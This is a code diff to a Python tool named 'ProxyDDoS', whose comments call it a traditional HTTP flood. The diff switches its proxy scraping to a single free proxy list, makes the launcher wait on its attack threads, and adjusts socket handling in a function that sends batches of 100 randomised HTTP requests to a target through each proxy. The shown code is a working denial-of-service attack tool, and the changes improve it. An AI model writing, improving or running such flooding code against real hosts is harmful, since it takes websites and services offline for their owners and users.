@@ -293,16 +293,28 @@ def ProxyScraper(): # 抓取proxy的 , 用了無數次 可以肯定的說 50~70k
             "https://raw.githubusercontent.com/r00tee/Proxy-List/refs/heads/main/Https.txt"
     ]
 
-    print("Start Get Github Proxies")
-    for u in git_proxy_list:
-        host = u.split(".com/")[1]
-        r = requests.get(u)
-        if r.status_code == 200:
-            print(f"[ProxyDDoS]->status: \033[32;1m{r.status_code}\033[0m \033[36m{host}\033[0m")
-            lst = r.text.split("\n")
-            for lines in lst:
-                if len(lines) > 10 and len(lines) < 22:
-                    download_proxy.append(lines)
+    proxifly = "https://raw.githubusercontent.com/proxifly/free-proxy-list/refs/heads/main/proxies/protocols/http/data.txt"
+
+    print("fetch proxies from Proxifly")
+    r = requests.get(proxifly)
+    if r.status_code == 200:
+        print(f"[ProxyDDoS]->status: \033[32;1m{r.status_code}\033[0m \033[36mProxifly\033[0m")
+        lst = r.text.split('\n')
+        for lines in lst:
+            if len(lines) > 10 and len(lines) < 22:
+                download_proxy.append(lines)
+
+
+    # print("Start Get Github Proxies")
+    # for u in git_proxy_list:
+    #     host = u.split(".com/")[1]
+    #     r = requests.get(u)
+    #     if r.status_code == 200:
+    #         print(f"[ProxyDDoS]->status: \033[32;1m{r.status_code}\033[0m \033[36m{host}\033[0m")
+    #         lst = r.text.split("\n")
+    #         for lines in lst:
+    #             if len(lines) > 10 and len(lines) < 22:
+    #                 download_proxy.append(lines)
     
     download_proxy = sorted(set(download_proxy))
 
@@ -315,6 +327,8 @@ def launchThreads():
             th_list.append(t)
         except:
             pass
+    for th in th_list:
+        th.join()
 
 
 def send_requests(): #傳統HTTP FLOOD
@@ -343,7 +357,7 @@ def send_requests(): #傳統HTTP FLOOD
                 for _ in range(100):
                     s.send(f"{method} {path}?{rC(string)}={rInt(1,99999)}{rC(rand)} HTTP/1.1\r\nHost: {host}\r\n{header}".encode('utf-8'))
                 print(f"[ProxyDDoS]->Stress \033[36m{host}\033[0m From: \033[35;1m{proxy_ip}:{proxy_port}\033[0m")
-                # s.close()
+                s.close()
             except:
                 print(f"[ProxyDDoS]->Proxy: \033[35;1m{proxy_ip}:{proxy_port}\033[0m request \033[31;1mFailed\033[0m")
                 s.close()
